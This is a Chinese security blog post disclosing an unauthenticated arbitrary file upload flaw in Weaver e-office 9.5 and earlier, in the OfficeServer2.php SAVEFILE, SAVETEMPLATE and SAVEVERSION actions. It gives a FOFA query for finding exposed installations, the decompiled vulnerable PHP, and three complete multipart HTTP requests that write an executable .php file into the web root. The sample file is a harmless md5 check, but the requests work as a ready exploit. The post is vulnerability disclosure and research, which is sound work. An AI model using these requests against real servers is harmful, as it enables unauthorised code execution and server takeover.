---
title: "泛微e-office OfficeServer2.php 文件上传漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html
asset_dir: assets/泛微e-office-officeserver2.php-文件上传漏洞
---

# 泛微e-office OfficeServer2.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/9 08:26
* 1095浏览
* [0评论](#comment)
* 51分钟阅读

深入探索

Office

SERVER

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer2.php` 接口 `SAVEFILE` 、`SAVEVERSION` 和 `SAVETEMPLATE` 存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

在线安全工具

VPN服务

Docker加速服务

## SAVEFILE

```
$mFilePath = $_SERVER['DOCUMENT_ROOT']."attachment";
......
case "SAVEFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], ( "utf-8", "gbk", $mFullPath ) ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgError = $_lang['file_save_fail'];
            $result = false;
        }
    }
    else
    {
        $MsgError = $_lang['file_upload_fail'];
        $result = false;
    }
    if ( !$result )
    {
        break;
    }
    $MsgObj = $MsgObj."STATUS=".( $_lang['file_save_success']."!" )."\r\n";
    break;
```

深入探索

JSON处理工具

安全研究报告

云安全解决方案

因 `FILENAME` 和 `RECORDID` 参数用户可控，导致可以上传任意文件并执行远程代码。

漏洞修复方案

## SAVETEMPLATE

```
case "SAVETEMPLATE" :
    $mRecordID = $TEMPLATE;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mFullPath = $mFilePath."/".$mRecordID.$mFileType;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $MsgObj = $MsgObj."mFullPath=".( "mFullPath" )."\r\n";
    $mDescript = $DESCRIPT;
    $mFileDate = $FileDate;
    $mUserName = $UserName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgError = "Save File Error";
            $result = false;
        }
    }
```

## SAVEVERSION

```
case "SAVEVERSION" :
    $mRecordID = $RECORDID;
    $mUserName = $USERNAME;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mDescript = $DESCRIPT;
    $mFileDate = ( "Y-m-d H:i:s" );
    $mSql = "insert into Version_File (RecordID,FileType,FileDate,FilePath,UserName,Descript) values ('".$mRecordID."','".$mFileType."','".$mFileDate."','".$mFilePath."','".$mUserName."','".$mDescript."')";
    if ( ( $mSql ) )
    {
        $result = true;
    }
    else
    {
        $result = false;
    }
    $mSql = "SELECT Max(FileID) as FileID FROM Version_File WHERE RecordID='".$mRecordID."'";
    $rs = ( $mSql );
    if ( $row = ( $rs ) )
    {
        $mFileID = $row['FileID'];
        $MsgObj = $MsgObj."FILID=".( $mFileID )."\r\n";
    }
    $mFullPath = $mFilePath."/".$mRecordID.$mFileID.$mFileType;
    $MsgObj = $MsgObj."FULPATH=".( $mFullPath )."\r\n";
    if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
    {
        $mFileSize = $_FILES['MsgFileBody']['size'];
        $result = true;
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_save_version'].$mFullPath )."\r\n";
    }
    else
    {
        $MsgObj = $MsgObj."STATUS=".( "Save File Error".$mFullPath )."\r\n";
        $result = false;
    }
```

# 漏洞复现

## SAVEFILE

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILENAME"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEFILE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-001-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVETEMPLATE

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="TEMPLATE"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVETEMPLATE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-002-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVEVERSION

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="RECORDID"

test
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEVERSION
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILETYPE"

.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

响应里包含文件物理路径，base64解码后即可看到文件名，一般为 RECORDID+FileID 组成，如 test1.php

物流软件安全

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-003-3584d2da24c1.webp)](https://image.mrxn.net/ba44034947bb45a4b2d3754cd8edf253.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.SAVEFILE](#toc-4-1-)
* [4.2.SAVETEMPLATE](#toc-4-2-)
* [4.3.SAVEVERSION](#toc-4-3-)
* [5.漏洞复现](#toc-5-)
* [5.1.SAVEFILE](#toc-5-1-)
* [5.2.SAVETEMPLATE](#toc-5-2-)
* [5.3.SAVEVERSION](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office OfficeServer2.php 文件上传漏洞](https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html)  
文章链接：<https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

防病毒程序与恶意软件

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALkUlEQVR4AeybCZLbyA5E9Xz/O/s3lH4UC2Rp6bFbivjVYUwyF4BlgpoeL/Prcrn8/k79/vNl7x+6wUw3MPO7PuNdd27hzFMXK3uveq5ze7su/w7WQr761o9PeQLbQr62fXmmZgcHLnCrnoN4Mx3iewZznauLkD64Ye+BeDN9NktdtB8yD4L6Hc0/wn3ftpC9uK7f9wQOC4FsHUZ89Yi+FZA59sPIzenPENL3bL7mwNgD4eVVvTKr8tarfZD7wojO2+NhIXtzXf/8E/jPC/FtEf0pQN4GeffVIbmZb06E5OV77DM632f315CZ5kUzEB+C6mLPq38H//NCvnPT1TN/Av9sIb41IuTtkouzo0HyEJzl9jokC+fY7wnJdd2Z6h27L/8b+M8W8jcO9/8447CQ/jbIZw8H8pYN/heB6BB8NOer5aUfzjvDlwZ9hSFnhBG/rOsPiH4lX/+AkX9Jd3+cnbG0s6bDQs5CS/u5J7AtBLJ1uI/PHq3egKqeh8zvuhziV2+Vel1XyUVIHlDasPJVm9AuyqtSrusq+bMIXH+XouchOtzHfd+2kL24rt/3BH7VG/Gd6keGvAVd79x7qcsh/fLuyzuaL+zes7x6q8zXdZW8Y3lVcP/MlXm11iekP+0388NCIFuHET0nRJfPEJLzDYHwnofosxzEn/VBfLhhzzq763DrAbp9/b4AbL8LDmwazHUYc30wjD7c+GEhvXnxn30Cv+C2Hbhtvb9VkFzXZ8ftOTlkDgTV+xyI33XzZ2hWD85n9Jy8o3Me6bNc74Ocx/wZrk9If2pv5of/yoJs0XO5RTmMvrrY8+odzcE4T73j5XK5joDk4YjXwO4fzoBkd9b1EqKbu4pf/4DoEPySrj/MwahDuH5HiH8d8vUPCIcjrk/I1wP6pB+H7yH9cJAtqrt9udh1GPvgPncOjDn1GXrfQjPw3IzqqYL7eYgPQe8j1owqGH0IL++sen9l1ifEp/IhOF0InG8Xonv+2moVPKf3vuqtUu8ImQtB/eqpkhcWr6rrKkhPaVUQXt6+yquC0S+tap+t69KqIHkIllZVmbOC5CB4lpku5Cy8tH//BLaF1GbPCsZtmvFoE